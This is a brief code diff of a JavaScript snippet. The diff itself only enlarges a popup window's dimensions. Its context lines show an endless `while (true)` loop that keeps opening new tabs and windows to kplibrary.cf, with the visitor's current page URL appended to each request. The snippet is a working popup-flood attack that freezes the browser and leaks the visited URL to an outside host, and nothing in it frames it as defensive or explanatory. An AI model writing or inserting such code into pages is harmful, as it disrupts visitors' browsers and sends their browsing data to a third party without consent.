@@ -8,7 +8,7 @@ if (popUp == null || typeof(popUp) == 'undefined') {
   while (true) {
     window.open("http://kplibrary.cf/")
       //: Opens new tab of kplibrary.cf^
-    var strWindowFeatures = "location=yes,height=670,width=620,scrollbars=yes,status=yes";
+    var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
     var URL = "http://kplibrary.cf/" + location.href;
     var win = window.open(URL, "_blank", strWindowFeatures);
     txt = "a";
